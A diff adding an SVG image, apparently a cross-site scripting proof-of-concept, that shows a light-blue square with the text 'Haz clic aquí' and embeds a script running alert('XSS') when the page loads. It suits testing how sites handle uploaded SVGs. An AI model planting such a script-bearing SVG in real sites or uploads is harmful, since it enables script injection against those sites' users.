@@ -1,0 +1,15 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" viewBox="0 0 100 100">
+  <!-- Elementos gráficos -->
+  <rect width="100" height="100" fill="lightblue" />
+  <text x="10" y="50" font-size="16" fill="black">Haz clic aquí</text>
+  
+  <!-- Script para la alerta -->
+  <script>
+    // Añade un evento al SVG
+    <![CDATA[
+      document.addEventListener('DOMContentLoaded', function() {
+        alert('XSS');
+      });
+    ]]>
+  </script>
+</svg>
